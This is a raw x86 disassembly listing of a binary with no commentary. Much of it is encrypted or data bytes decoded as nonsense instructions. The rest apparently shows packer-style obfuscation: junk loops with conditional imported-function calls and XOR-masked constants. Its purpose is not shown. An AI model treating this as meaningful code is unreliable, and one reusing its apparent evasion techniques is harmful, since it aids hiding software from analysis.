  41dfbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfbf:	fsub   st(1),st
  41dfc1:	jmp    0x41dff2
  41dfc3:	pop    eax
  41dfc4:	addr16 dec ebx
  41dfc6:	clc    
  41dfc7:	push   edx
  41dfc8:	retf   
  41dfc9:	dec    cx
  41dfcb:	shl    al,cl
  41dfcd:	dec    eax
  41dfce:	mov    ecx,0x4f4b9ac
  41dfd3:	jbe    0x41dfc7
  41dfd5:	imul   edx,DWORD PTR [ecx+0x7d],0xffffffdc
  41dfd9:	mov    dh,0x8c
  41dfdb:	int    0x4
  41dfdd:	add    BYTE PTR [ecx+ebp*4],bl
  41dfe0:	repz add ebp,edx
  41dfe3:	and    DWORD PTR [edi-0x79],0xf527da4e
  41dfea:	ds push ds
  41dfec:	xchg   eax,esi
  41dfee:	out    0x72,al
  41dff0:	sti    
  41dff1:	mov    ecx,0xc2c94198
  41dff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dff7:	daa    
  41dff8:	pop    esi
  41dff9:	fdiv   DWORD PTR [ebp-0x65]
  41dffc:	add    BYTE PTR [esi-0x3a994364],0x8b
  41e003:	add    al,0x99
  41e005:	sub    BYTE PTR [ebx],bl
  41e007:	cld    
  41e008:	sub    edi,DWORD PTR [ebx]
  41e00a:	mov    al,ds:0xc5549e76
  41e00f:	mov    BYTE PTR [edx],ah
  41e011:	jg     0x41e030
  41e013:	push   ss
  41e014:	es push esp
  41e016:	int3   
  41e017:	adc    al,0xe
  41e019:	inc    ebx
  41e01a:	xchg   edi,eax
  41e01b:	(bad)  
  41e01c:	push   eax
  41e01d:	loopne 0x41dfd9
  41e01f:	stos   DWORD PTR es:[edi],eax
  41e020:	adc    edx,esi
  41e022:	mov    bh,0xb7
  41e024:	add    dl,BYTE PTR [esi]
  41e026:	(bad)  [ecx]
  41e028:	mov    al,0xc5
  41e02a:	scas   eax,DWORD PTR es:[edi]
  41e02b:	push   0xc5c5d734
  41e030:	out    0x3e,eax
  41e032:	sbb    bh,BYTE PTR [edi+0x18079acd]
  41e038:	add    BYTE PTR [ecx+ebp*1-0x399c273f],al
  41e03f:	push   edx
  41e040:	int3   
  41e041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e042:	mov    esp,0x1269112e
  41e047:	xchg   edx,eax
  41e048:	pop    edi
  41e049:	jecxz  0x41e09a
  41e04b:	cmp    al,0x3f
  41e04d:	mov    dl,0x61
  41e04f:	jg     0x41dfd2
  41e051:	das    
  41e052:	pop    ebp
  41e053:	dec    esi
  41e054:	jnp    0x41e0a6
  41e056:	inc    esi
  41e057:	pop    esi
  41e058:	cmp    DWORD PTR [edi+0x7179b60e],ecx
  41e05e:	cli    
  41e05f:	inc    eax
  41e060:	cmp    bh,BYTE PTR [ecx]
  41e062:	imul   eax,ebx,0xa98b3305
  41e068:	push   0xc0b52c11
  41e06d:	enter  0x49a2,0x1d
  41e071:	pop    edi
  41e072:	add    BYTE PTR [esi+0x1520be05],dh
  41e078:	jle    0x41e0b4
  41e07a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e07b:	stc    
  41e07c:	and    al,0x25
  41e07e:	je     0x41e038
  41e080:	push   ecx
  41e081:	push   edx
  41e082:	push   esi
  41e083:	ret    0x8342
  41e086:	xchg   edi,eax
  41e087:	test   al,0x6c
  41e089:	(bad)  
  41e08a:	addr16 push ebp
  41e08c:	icebp  
  41e08d:	xchg   BYTE PTR ds:0xae34aab8,bl
  41e093:	aam    0xbe
  41e095:	push   0xffffffc8
  41e097:	mov    DWORD PTR [esp+esi*1+0x7acc166e],ebx
  41e09e:	mov    ch,0xbf
  41e0a0:	jecxz  0x41e0d8
  41e0a2:	xor    al,0xc0
  41e0a4:	jle    0x41e0c3
  41e0a6:	sub    esp,DWORD PTR [edi]
  41e0a8:	pop    edx
  41e0a9:	ret    
  41e0aa:	and    DWORD PTR [ebx],eax
  41e0ac:	and    DWORD PTR [edx+0x40],ebp
  41e0af:	jae    0x41e07d
  41e0b1:	inc    ebp
  41e0b2:	cmp    eax,0x9c92939a
  41e0b7:	in     eax,0xef
  41e0b9:	add    al,0xb8
  41e0bb:	mov    dl,0x5d
  41e0bd:	shl    bh,0xe2
  41e0c0:	cmp    esp,DWORD PTR [edi+0x72a29e06]
  41e0c6:	jb     0x41e121
  41e0c8:	cmc    
  41e0c9:	aas    
  41e0ca:	les    ecx,FWORD PTR [ebp+0x64b6d04a]
  41e0d0:	jbe    0x41e092
  41e0d2:	xor    ebx,DWORD PTR cs:[ecx+eax*1-0x36]
  41e0d7:	lahf   
  41e0d8:	sahf   
  41e0d9:	out    0x9a,al
  41e0db:	cmp    BYTE PTR [edi+0x599d60b7],cl
  41e0e1:	push   ebp
  41e0e2:	xchg   esp,eax
  41e0e3:	dec    edx
  41e0e4:	xchg   DWORD PTR [esi+0x3],ebx
  41e0e7:	aam    0xa3
  41e0e9:	mov    eax,0x8e8b92e0
  41e0ee:	arpl   WORD PTR [eax+edx*8],sp
  41e0f1:	inc    edi
  41e0f2:	sbb    eax,0x4fa9b6a5
  41e0f7:	fidiv  DWORD PTR fs:[edi+0x5303b165]
  41e0fe:	inc    esp
  41e0ff:	loope  0x41e0b0
  41e101:	push   ebp
  41e102:	jne    0x41e17a
  41e104:	xchg   edx,eax
  41e105:	push   ebp
  41e106:	jmp    FWORD PTR [ecx+edi*8]
  41e109:	ds jp  0x41e0dc
  41e10c:	push   edx
  41e10d:	cmp    DWORD PTR [esi],ebx
  41e10f:	or     edi,DWORD PTR [edi-0x59]
  41e112:	in     al,0x70
  41e114:	sub    eax,0x9e357b39
  41e119:	pop    bx
  41e11b:	jne    0x41e15b
  41e11d:	or     al,0x94
  41e11f:	or     DWORD PTR [ecx+0x7a],ebp
  41e122:	lock mov ecx,0x26956486
  41e128:	adc    BYTE PTR [esi],0x39
  41e12b:	ret    0x7fa4
  41e12e:	jl     0x41e193
  41e130:	adc    bl,BYTE PTR [edx+0x772f052e]
  41e136:	(bad)  
  41e138:	pop    esi
  41e139:	int    0xdc
  41e13b:	(bad)  
  41e13d:	iret   
  41e13e:	iretw  
  41e140:	or     al,0xda
  41e142:	bound  ebp,QWORD PTR [si+0xd2b]
  41e147:	or     eax,0x2d06d280
  41e14c:	xor    ecx,DWORD PTR [edi]
  41e14e:	out    0x63,eax
  41e150:	out    0xfa,eax
  41e152:	push   0x49
  41e154:	ret    0xf118
  41e157:	imul   BYTE PTR [edi+0x4]
  41e15a:	stos   BYTE PTR es:[edi],al
  41e15b:	fild   QWORD PTR [edx+edx*8-0x1e]
  41e15f:	div    BYTE PTR [edi]
  41e161:	push   0xeeb0a720
  41e166:	mov    es,WORD PTR [ecx+0x3f6cd298]
  41e16c:	jge    0x41e0f0
  41e16e:	mov    WORD PTR [ecx-0x11],gs
  41e171:	fsub   st(2),st
  41e173:	arpl   dx,di
  41e175:	cs xor eax,0x50b0aad2
  41e17b:	ins    BYTE PTR es:[edi],dx
  41e17c:	hlt    
  41e17d:	and    al,0x4d
  41e17f:	loopne 0x41e184
  41e181:	sbb    al,BYTE PTR [ecx]
  41e183:	xchg   esi,eax
  41e184:	cmp    al,0x9b
  41e186:	push   ebp
  41e187:	or     DWORD PTR [ebp-0xb],0x1f1e3575
  41e18e:	iret   
  41e18f:	mov    fs,WORD PTR [esi-0x465135c0]
  41e195:	arpl   WORD PTR [esi],sp
  41e197:	(bad)  [ecx+0x1a1aeabc]
  41e19d:	out    dx,al
  41e19e:	cmp    al,0x9a
  41e1a0:	push   ebx
  41e1a1:	jp     0x41e199
  41e1a3:	shl    BYTE PTR [ecx],0xf3
  41e1a6:	pop    esi
  41e1a7:	xchg   esp,eax
  41e1a8:	scas   al,BYTE PTR es:[edi]
  41e1a9:	inc    edi
  41e1aa:	scas   al,BYTE PTR es:[edi]
  41e1ab:	mov    ah,0x3b
  41e1ad:	nop
  41e1ae:	into   
  41e1af:	xchg   esp,eax
  41e1b0:	test   BYTE PTR [ebp+0x18],dh
  41e1b3:	pop    ss
  41e1b4:	push   ebp
  41e1b5:	pop    ecx
  41e1b6:	test   al,0x93
  41e1b8:	sub    eax,0x4938622e
  41e1bd:	test   eax,0x7f9a363f
  41e1c2:	mov    DWORD PTR [eax+edx*1],eax
  41e1c5:	lahf   
  41e1c6:	jge    0x41e224
  41e1c8:	sbb    DWORD PTR [ebx+0x51],esi
  41e1cb:	and    BYTE PTR [edx-0x69829c1f],al
  41e1d1:	fsubr  QWORD PTR [esi]
  41e1d3:	push   eax
  41e1d4:	ds mov ebp,0xf493bfc3
  41e1da:	test   eax,0x201a2fa
  41e1df:	xor    ebp,ebx
  41e1e1:	push   ds
  41e1e2:	test   edi,0x8ce6bd56
  41e1e8:	(bad)
  41e1ed:	sub    esp,DWORD PTR gs:[ebp+0x358ad6fd]
  41e1f4:	cs jge 0x41e220
  41e1f7:	cwde   
  41e1f8:	cmp    al,0xc4
  41e1fa:	call   0xe34b:0x1ef977b5
  41e201:	ins    DWORD PTR es:[edi],dx
  41e202:	xor    al,0x56
  41e204:	test   BYTE PTR [esi+0x65feec7d],bh
  41e20a:	or     BYTE PTR fs:[eax-0x1f],dh
  41e20e:	mov    ah,0x2a
  41e210:	in     eax,0xea
  41e212:	jo     0x41e249
  41e214:	push   ds
  41e215:	jle    0x41e262
  41e217:	xor    edx,eax
  41e219:	fwait
  41e21a:	dec    ebp
  41e21b:	cmp    ah,BYTE PTR [eax-0x15324feb]
  41e221:	popf   
  41e222:	lods   al,BYTE PTR ds:[esi]
  41e223:	adc    ebp,DWORD PTR [esp+esi*8+0x301163c9]
  41e22a:	sbb    edx,ecx
  41e22c:	cmc    
  41e22d:	pusha  
  41e22e:	jmp    0x491e2481
  41e233:	inc    ebx
  41e234:	out    0x66,al
  41e236:	or     eax,0xe64840c9
  41e23b:	cwde   
  41e23c:	xlat   BYTE PTR ds:[ebx]
  41e23d:	mov    al,ds:0xe0356523
  41e242:	fld    QWORD PTR es:[eax+0x5d3da3aa]
  41e249:	ins    DWORD PTR es:[edi],dx
  41e24a:	cmp    BYTE PTR [ebx+0x18],0xb0
  41e24e:	mov    cl,0x7e
  41e250:	mov    al,ds:0xd348825b
  41e255:	ins    BYTE PTR es:[edi],dx
  41e256:	nop
  41e257:	sub    eax,DWORD PTR [edx]
  41e259:	ret    0xd514
  41e25c:	and    DWORD PTR [ebx+0x1b8f1dc2],esp
  41e262:	and    esp,0x3a18beab
  41e268:	dec    esi
  41e269:	adc    BYTE PTR [ebp-0x1ab26c1e],ch
  41e26f:	sahf   
  41e270:	aam    0xa2
  41e272:	pop    es
  41e273:	mov    ebx,0xbeffda22
  41e278:	test   eax,0xcc2f359e
  41e27d:	add    cl,BYTE PTR [ecx]
  41e27f:	and    al,0x6a
  41e281:	out    0x29,eax
  41e283:	les    eax,FWORD PTR [ecx+ebx*4-0x44]
  41e287:	dec    eax
  41e288:	call   DWORD PTR [eax-0x2f]
  41e28b:	and    BYTE PTR [esi+0x26],dh
  41e28e:	frstor [ebp+0x381c2f29]
  41e294:	(bad)  
  41e295:	adc    al,0xc6
  41e297:	pop    ss
  41e298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e299:	xchg   ecx,eax
  41e29a:	adc    al,0x4f
  41e29c:	jmp    0xa407cdc5
  41e2a1:	jge    0x41e2ba
  41e2a3:	inc    ebp
  41e2a4:	mov    edi,0x3fa30b67
  41e2a9:	xchg   ecx,eax
  41e2aa:	hlt    
  41e2ab:	(bad)  
  41e2ac:	cmc    
  41e2ad:	jge    0x41e254
  41e2af:	and    ah,BYTE PTR [ebx+0x2c]
  41e2b2:	sbb    al,0x48
  41e2b4:	pop    edi
  41e2b5:	dec    esi
  41e2b6:	cdq    
  41e2b7:	or     dh,BYTE PTR [edi-0x19962089]
  41e2bd:	ds retf 
  41e2bf:	test   al,0x1c
  41e2c1:	cmp    edi,DWORD PTR ds:0xc8900cca
  41e2c7:	pop    es
  41e2c8:	loopne 0x41e299
  41e2ca:	rcl    bh,1
  41e2cc:	add    BYTE PTR [edx+0x53],al
  41e2cf:	adc    BYTE PTR [eax],ch
  41e2d1:	ja     0x41e274
  41e2d3:	das    
  41e2d4:	icebp  
  41e2d5:	adc    DWORD PTR [ebp+0x31],edx
  41e2d8:	xchg   esp,eax
  41e2d9:	pop    edi
  41e2da:	sub    DWORD PTR [esi],eax
  41e2dc:	and    ax,0xef86
  41e2e0:	add    esi,DWORD PTR [ebx-0x47b09ebc]
  41e2e6:	mov    esp,0xee44f668
  41e2eb:	add    ecx,DWORD PTR [eax+0x2d]
  41e2ee:	xchg   ecx,eax
  41e2ef:	jne    0x41e287
  41e2f1:	repnz cld 
  41e2f3:	sub    eax,DWORD PTR [ebp-0x6]
  41e2f6:	adc    dl,cl
  41e2f8:	jl     0x41e288
  41e2fa:	ret    
  41e2fb:	inc    ebx
  41e2fc:	stos   DWORD PTR es:[edi],eax
  41e2fd:	mov    esi,0x2e46aab6
  41e302:	push   es
  41e303:	dec    ah
  41e305:	fist   WORD PTR [edx+0x22]
  41e308:	js     0x41e372
  41e30a:	or     DWORD PTR [ecx+0x5cab5c3a],ebp
  41e310:	mov    eax,ds:0xb5936a3e
  41e315:	dec    esp
  41e316:	mov    cl,0x73
  41e318:	in     al,dx
  41e319:	jno    0x41e35c
  41e31b:	cdq    
  41e31c:	mov    dl,0xc1
  41e31e:	cdq    
  41e31f:	mov    ch,0xc7
  41e321:	ds stc 
  41e323:	aad    0xf7
  41e325:	sub    ebp,DWORD PTR [ecx]
  41e327:	push   0xffffff9f
  41e329:	adc    DWORD PTR [ecx+0x4b1b2d3b],ecx
  41e32f:	mov    ch,0xbd
  41e331:	xchg   ebx,ebx
  41e333:	xchg   ecx,esp
  41e335:	sub    edx,eax
  41e337:	data16 clc 
  41e339:	sub    BYTE PTR ss:[ebp-0x5592c299],0xb8
  41e341:	xchg   DWORD PTR [eax-0x61],ebx
  41e344:	mov    BYTE PTR [edi*4+0x30987954],bl
  41e34b:	test   al,0xd8
  41e34d:	mov    DWORD PTR [eax],ebx
  41e34f:	dec    ecx
  41e350:	mov    es,WORD PTR ds:0xba64728
  41e356:	mov    al,0xf4
  41e358:	ret    
  41e359:	sbb    BYTE PTR ds:0x36db6503,bh
  41e35f:	shl    ecx,1
  41e361:	jnp    0x41e2ee
  41e363:	ror    DWORD PTR [edi+0x588c8b36],1
  41e369:	out    dx,al
  41e36a:	(bad)  
  41e36b:	mov    ecx,0xe2a3ac2f
  41e370:	fadd   QWORD PTR [edi-0x6f]
  41e373:	ins    BYTE PTR es:[edi],dx
  41e374:	rol    BYTE PTR [edi+0x71],0xb0
  41e378:	in     eax,dx
  41e379:	push   0xc5eac611
  41e37e:	jg     0x41e344
  41e380:	or     DWORD PTR [ecx-0x7f0d3400],esi
  41e386:	mov    edx,0x320c0e36
  41e38b:	add    edx,DWORD PTR [ebp+0x77]
  41e38e:	call   FWORD PTR [eax]
  41e390:	mov    BYTE PTR [edx+0x79],0xab
  41e394:	aad    0x8c
  41e396:	mul    BYTE PTR gs:[edx+edi*2+0x2d667e35]
  41e39e:	(bad)  
  41e39f:	bound  ebp,QWORD PTR [edi+0x6f]
  41e3a2:	xchg   eax,ebp
  41e3a4:	or     eax,0xc6f2087b
  41e3a9:	ds jmp 0x41e36c
  41e3ac:	ror    BYTE PTR [ecx-0x36],0xf5
  41e3b0:	or     DWORD PTR [edi],esp
  41e3b2:	ror    DWORD PTR [edx],0xb1
  41e3b5:	adc    DWORD PTR [edi-0x21115ab6],esp
  41e3bb:	div    BYTE PTR [edx]
  41e3bd:	and    edi,eax
  41e3bf:	xchg   ebx,eax
  41e3c0:	or     DWORD PTR [ebx+0x5a7817d4],0xffffffb4
  41e3c7:	pop    ebx
  41e3c8:	jl     0x41e40e
  41e3ca:	xchg   edi,eax
  41e3cb:	push   0xffffff8e
  41e3cd:	sbb    al,0x6d
  41e3cf:	je     0x41e37e
  41e3d1:	xor    DWORD PTR [edx+edx*8-0x59],ecx
  41e3d5:	aaa    
  41e3d6:	sub    cl,BYTE PTR [esi+edx*1+0x1c]
  41e3da:	mov    eax,0x3b32fafc
  41e3df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3e0:	jmp    0x41e3e3
  41e3e2:	retf   
  41e3e3:	mov    bh,bl
  41e3e5:	add    DWORD PTR [edx],ebp
  41e3e7:	fisub  WORD PTR [edx*4+0x2f6bb30b]
  41e3ee:	and    BYTE PTR [eax+0x3e27c436],dl
  41e3f4:	pop    ds
  41e3f5:	dec    edx
  41e3f6:	aas    
  41e3f7:	fcomp  DWORD PTR [edi+0x30]
  41e3fa:	inc    eax
  41e3fb:	dec    edx
  41e3fc:	push   ds
  41e3fd:	gs dec ebp
  41e3ff:	(bad)  
  41e400:	outs   dx,BYTE PTR ds:[esi]
  41e401:	out    0xe0,eax
  41e403:	mov    DWORD PTR [ebp-0x20],eax
  41e406:	mov    DWORD PTR ds:0x429028,0x1e
  41e410:	cmp    DWORD PTR ds:0x429028,0x0
  41e417:	je     0x41e45f
  41e41d:	cmp    DWORD PTR ds:0x429028,0x2e
  41e424:	jne    0x41e43f
  41e42a:	push   0x88e3
  41e42f:	push   0x5900
  41e434:	push   0x6949
  41e439:	call   DWORD PTR ds:0x425044
  41e43f:	mov    eax,ds:0x429028
  41e444:	dec    eax
  41e445:	mov    ds:0x429028,eax
  41e44a:	jmp    0x41e410
  41e44f:	mov    eax,ds:0x4245b9
  41e454:	mov    ecx,DWORD PTR ds:0x423e56
  41e45a:	sub    ecx,eax
  41e45c:	or     eax,DWORD PTR [eax+ecx*1]
  41e45f:	mov    eax,ds:0x424092
  41e464:	mov    eax,DWORD PTR [eax]
  41e466:	mov    DWORD PTR [ebp-0x28],eax
  41e469:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  41e470:	mov    eax,DWORD PTR [ebp-0x38]
  41e473:	mov    DWORD PTR ds:0x42b004,0x13
  41e47d:	cmp    DWORD PTR ds:0x42b004,0x0
  41e484:	je     0x41e4fb
  41e48a:	cmp    DWORD PTR ds:0x42b004,0x19
  41e491:	jne    0x41e4ad
  41e497:	push   0x8602
  41e49c:	push   DWORD PTR [ebp-0x28]
  41e49f:	push   DWORD PTR [ebp-0x18]
  41e4a2:	push   0x5ed1
  41e4a7:	call   DWORD PTR ds:0x425048
  41e4ad:	mov    ecx,DWORD PTR ds:0x42b004
  41e4b3:	dec    ecx
  41e4b4:	mov    DWORD PTR ds:0x42b004,ecx
  41e4ba:	jmp    0x41e47d
  41e4bf:	and    DWORD PTR ds:0x42d010,0x0
  41e4c9:	mov    ecx,DWORD PTR ds:0x42d010
  41e4cf:	inc    ecx
  41e4d0:	mov    DWORD PTR ds:0x42d010,ecx
  41e4d6:	cmp    DWORD PTR ds:0x42d010,0x1d
  41e4dd:	jne    0x41e4ee
  41e4e3:	push   0x7e2c
  41e4e8:	call   DWORD PTR ds:0x42504c
  41e4ee:	cmp    DWORD PTR ds:0x42d010,0x1c
  41e4f5:	jb     0x41e4c9
  41e4fb:	xor    eax,esi
  41e4fd:	and    DWORD PTR ds:0x429008,0x0
  41e507:	jmp    0x41e519
  41e50c:	mov    ecx,DWORD PTR ds:0x429008
  41e512:	inc    ecx
  41e513:	mov    DWORD PTR ds:0x429008,ecx
  41e519:	cmp    DWORD PTR ds:0x429008,0x14
  41e520:	jae    0x41e568
  41e526:	cmp    DWORD PTR ds:0x429008,0xb
  41e52d:	jne    0x41e543
  41e533:	push   0x3d49
  41e538:	push   0x424399
  41e53d:	call   DWORD PTR ds:0x425010
  41e543:	cmp    DWORD PTR ds:0x429008,0xa
  41e54a:	jne    0x41e55d
  41e550:	mov    ecx,DWORD PTR ds:0x429008
  41e556:	inc    ecx
  41e557:	mov    DWORD PTR ds:0x429008,ecx
  41e55d:	jmp    0x41e50c
  41e562:	and    ecx,0x72e7
  41e568:	add    eax,edi
  41e56a:	xor    DWORD PTR ds:0x42c010,0x649e
  41e574:	mov    DWORD PTR [ebp-0x30],eax
  41e577:	mov    ecx,DWORD PTR ds:0x429028
  41e57d:	xor    DWORD PTR ds:0x42b018,ecx
  41e583:	mov    eax,ds:0x42400a
  41e588:	sbb    ecx,0x5dc9
  41e58e:	mov    DWORD PTR [ebp-0x30],eax
  41e591:	sub    eax,eax
  41e593:	mov    eax,DWORD PTR [ebp-0x20]
  41e596:	mov    DWORD PTR [ebp-0x14],eax
  41e599:	mov    eax,DWORD PTR [ebp-0x14]
  41e59c:	push   0x4
  41e59e:	not    ecx
  41e5a0:	pop    ecx
  41e5a1:	adc    DWORD PTR ds:0x42a004,0x37d1
  41e5ab:	sub    ecx,eax
  41e5ad:	add    ecx,DWORD PTR [ebp-0x28]
  41e5b0:	mov    eax,ds:0x429024
  41e5b5:	or     DWORD PTR ds:0x42a008,eax
  41e5bb:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41e5c2:	mov    DWORD PTR ds:0x42a008,0x13
  41e5cc:	cmp    DWORD PTR ds:0x42a008,0x0
  41e5d3:	je     0x41e627
  41e5d9:	cmp    DWORD PTR ds:0x42a008,0x9
  41e5e0:	jne    0x41e5f6
  41e5e6:	push   0x665a
  41e5eb:	push   0x4c85
  41e5f0:	call   DWORD PTR ds:0x425018
  41e5f6:	cmp    DWORD PTR ds:0x42a008,0xa
  41e5fd:	jne    0x41e60e
  41e603:	mov    eax,ds:0x42a008
  41e608:	dec    eax
  41e609:	mov    ds:0x42a008,eax
  41e60e:	xor    eax,eax
  41e610:	xor    eax,DWORD PTR ds:0x42a008
  41e616:	dec    eax
  41e617:	mov    ds:0x42a008,eax
  41e61c:	jmp    0x41e5cc
  41e621:	and    DWORD PTR ds:0x42c018,edi
  41e627:	mov    DWORD PTR [ebp-0x24],ecx
  41e62a:	and    DWORD PTR ds:0x42b000,0x4083
  41e634:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  41e63e:	mov    eax,DWORD PTR [ebp-0x14]
  41e641:	sub    DWORD PTR ds:0x429028,0x42c00c
  41e64b:	mov    DWORD PTR [ebp-0x94],eax
  41e651:	mov    DWORD PTR ds:0x429018,0x60a2
  41e65b:	mov    eax,DWORD PTR [ebp-0x24]
  41e65e:	mov    DWORD PTR [ebp-0x90],eax
  41e664:	sub    eax,0x1a7d
  41e669:	mov    eax,DWORD PTR [ebp-0x2c]
  41e66c:	add    DWORD PTR ds:0x429014,0x42b010
  41e676:	xor    eax,esi
  41e678:	add    eax,edi
  41e67a:	or     DWORD PTR ds:0x42a01c,0xdce
  41e684:	mov    DWORD PTR [ebp-0x8c],eax
  41e68a:	xor    DWORD PTR ds:0x42d004,0x42a000
  41e694:	lea    eax,[ebp-0x50]
  41e697:	sub    DWORD PTR ds:0x429020,0x429004
  41e6a1:	mov    DWORD PTR [ebp-0x88],eax
  41e6a7:	sub    DWORD PTR ds:0x429028,0x1657
  41e6b1:	mov    eax,DWORD PTR [ebp-0x98]
  41e6b7:	xor    eax,esi
  41e6b9:	sub    DWORD PTR ds:0x42c01c,0x42d010
  41e6c3:	add    eax,edi
  41e6c5:	mov    DWORD PTR [ebp-0x98],eax
  41e6cb:	and    DWORD PTR ds:0x42d004,0x42b004
  41e6d5:	lea    eax,[ebp-0x98]
  41e6db:	sbb    DWORD PTR ds:0x42d008,0x429018
  41e6e5:	push   eax
  41e6e6:	and    DWORD PTR ds:0x42c004,edi
  41e6ec:	mov    eax,DWORD PTR [ebp+0xc]
  41e6ef:	sub    DWORD PTR ds:0x42b014,0x42a01c
  41e6f9:	xor    eax,esi
  41e6fb:	add    eax,edi
  41e6fd:	sbb    DWORD PTR ds:0x429024,0x42c01c
  41e707:	push   eax
  41e708:	and    eax,DWORD PTR ds:0x42c018
  41e70e:	mov    eax,ds:0x42402a
  41e713:	adc    DWORD PTR ds:0x429004,0x7be0
  41e71d:	push   0x423f80
  41e722:	and    DWORD PTR ds:0x429000,0x42b018
  41e72c:	push   DWORD PTR [eax]
  41e72e:	xor    DWORD PTR ds:0x42c014,0x72b4
  41e738:	call   0x40867e
  41e73d:	inc    eax
  41e73e:	mov    eax,DWORD PTR [ebp-0x14]
  41e741:	add    ecx,DWORD PTR ds:0x42b00c
  41e747:	mov    ecx,DWORD PTR [ebp-0x24]
  41e74a:	mov    DWORD PTR [ebp-0x4c],ecx
  41e74d:	mov    ecx,DWORD PTR [ebp+0x8]
  41e750:	xor    DWORD PTR ds:0x429020,0x42a008
  41e75a:	xor    ecx,esi
  41e75c:	mov    DWORD PTR [ebp-0x38],eax
  41e75f:	xor    DWORD PTR ds:0x42c014,0x42a014
  41e769:	add    ecx,edi
  41e76b:	jmp    0x423b8a
  41e770:	adc    ebx,DWORD PTR ds:0x429018
  41e776:	lea    edx,[ecx+eax*1]
  41e779:	mov    DWORD PTR ds:0x42d000,0x1d
  41e783:	cmp    DWORD PTR ds:0x42d000,0x0
  41e78a:	je     0x41e7ca
  41e790:	cmp    DWORD PTR ds:0x42d000,0x24
  41e797:	jne    0x41e7b0
  41e79d:	push   0x42a008
  41e7a2:	push   DWORD PTR [ebp-0x14]
  41e7a5:	push   0x4243b5
  41e7aa:	call   DWORD PTR ds:0x42501c
  41e7b0:	xor    ebx,ebx
  41e7b2:	add    ebx,DWORD PTR ds:0x42d000
  41e7b8:	dec    ebx
  41e7b9:	mov    DWORD PTR ds:0x42d000,ebx
  41e7bf:	jmp    0x41e783
  41e7c4:	and    DWORD PTR ds:0x42c010,ecx
  41e7ca:	mov    DWORD PTR [ebp-0x28],edx
  41e7cd:	sub    edx,ebx
  41e7cf:	mov    edx,DWORD PTR [ebp-0x4c]
  41e7d2:	and    DWORD PTR ds:0x42d00c,0x0
  41e7dc:	jmp    0x41e7ee
  41e7e1:	mov    ebx,DWORD PTR ds:0x42d00c
  41e7e7:	inc    ebx
  41e7e8:	mov    DWORD PTR ds:0x42d00c,ebx
  41e7ee:	cmp    DWORD PTR ds:0x42d00c,0x19
  41e7f5:	jae    0x41e843
  41e7fb:	cmp    DWORD PTR ds:0x42d00c,0xe
  41e802:	jne    0x41e818
  41e808:	push   0x42901c
  41e80d:	push   0x4df2
  41e812:	call   DWORD PTR ds:0x425020
  41e818:	cmp    DWORD PTR ds:0x42d00c,0xd
  41e81f:	jne    0x41e834
  41e825:	xor    ebx,ebx
  41e827:	xor    ebx,DWORD PTR ds:0x42d00c
  41e82d:	inc    ebx
  41e82e:	mov    DWORD PTR ds:0x42d00c,ebx
  41e834:	jmp    0x41e7e1
  41e839:	sbb    DWORD PTR ds:0x42d00c,0x42a014
  41e843:	sub    edx,ecx
  41e845:	sbb    DWORD PTR ds:0x429014,ebx
  41e84b:	mov    DWORD PTR [ebp-0x20],edx
  41e84e:	and    DWORD PTR ds:0x42d01c,0x0
  41e858:	mov    edx,DWORD PTR ds:0x42d01c
  41e85e:	inc    edx
  41e85f:	mov    DWORD PTR ds:0x42d01c,edx
  41e865:	cmp    DWORD PTR ds:0x42d01c,0x8
  41e86c:	jne    0x41e87b
  41e872:	push   DWORD PTR [ebp-0x10]
  41e875:	call   DWORD PTR ds:0x425028
  41e87b:	cmp    DWORD PTR ds:0x42d01c,0x7
  41e882:	jne    0x41e897
  41e888:	xor    edx,edx
  41e88a:	or     edx,DWORD PTR ds:0x42d01c
  41e890:	inc    edx
  41e891:	mov    DWORD PTR ds:0x42d01c,edx
  41e897:	cmp    DWORD PTR ds:0x42d01c,0x11
  41e89e:	jb     0x41e858
  41e8a4:	mov    edx,DWORD PTR [ebp-0x20]
  41e8a7:	mov    DWORD PTR [ebp-0x14],edx
  41e8aa:	mov    edx,DWORD PTR [ebp-0x28]
  41e8ad:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  41e8b4:	mov    DWORD PTR [ebp-0x44],edx
  41e8b7:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41e8be:	mov    edx,DWORD PTR [ebp-0x34]
  41e8c1:	xor    edx,esi
  41e8c3:	add    edx,edi
  41e8c5:	mov    DWORD PTR [ebp-0x10],edx
  41e8c8:	mov    edx,DWORD PTR [ebp-0x34]
  41e8cb:	xor    edx,esi
  41e8cd:	add    edx,edi
  41e8cf:	mov    DWORD PTR [ebp-0x8],edx
  41e8d2:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41e8d9:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41e8e0:	mov    edx,DWORD PTR [ebp-0x34]
  41e8e3:	mov    ebx,DWORD PTR [ebp-0x14]
  41e8e6:	xor    edx,esi
  41e8e8:	add    edx,edi
  41e8ea:	cmp    ebx,edx
  41e8ec:	je     0x423b7e
  41e8f2:	mov    eax,DWORD PTR [ebp-0x18]
  41e8f5:	xor    eax,esi
  41e8f7:	mov    edx,0xffcd8d25
  41e8fc:	sub    edx,eax
  41e8fe:	add    edx,DWORD PTR [ebp-0x14]
  41e901:	mov    eax,DWORD PTR [ebp-0x18]
  41e904:	mov    ebx,DWORD PTR [ebp-0x10]
  41e907:	xor    eax,esi
  41e909:	add    eax,edi
  41e90b:	imul   eax,ebx
  41e90e:	cmp    eax,edx
  41e910:	ja     0x423b7b
  41e916:	mov    edx,DWORD PTR [ebp-0x10]
  41e919:	mov    eax,DWORD PTR [ebp-0x14]
  41e91c:	mov    ebx,DWORD PTR [ebp-0x28]
  41e91f:	sub    eax,edx
  41e921:	xor    ebx,esi
  41e923:	xor    edx,edx
  41e925:	add    ebx,edi
  41e927:	div    ebx
  41e929:	mov    DWORD PTR [ebp-0x8],eax
  41e92c:	mov    eax,DWORD PTR [ebp-0x2c]
  41e92f:	mov    edx,DWORD PTR [ebp-0x8]
  41e932:	xor    eax,esi
  41e934:	add    eax,edi
  41e936:	cmp    edx,eax
